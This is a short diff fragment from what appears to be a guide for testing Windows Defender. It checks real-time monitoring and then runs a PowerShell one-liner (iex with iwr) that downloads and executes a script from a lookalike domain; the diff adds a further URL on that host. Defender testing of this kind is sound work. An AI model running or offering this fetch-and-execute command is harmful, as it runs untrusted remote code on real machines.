@@ -180,6 +180,8 @@ Verify that Defender is enabled and execute up on test host
 (Get-MpPreference).DisableRealtimeMonitoring
 
 iex(iwr "http://www.bleepincomputer.com/deals" -useb)
+
+http://www.bleepincomputer.com:80/debug
 ```
 
 Verify Defender is on on remote host
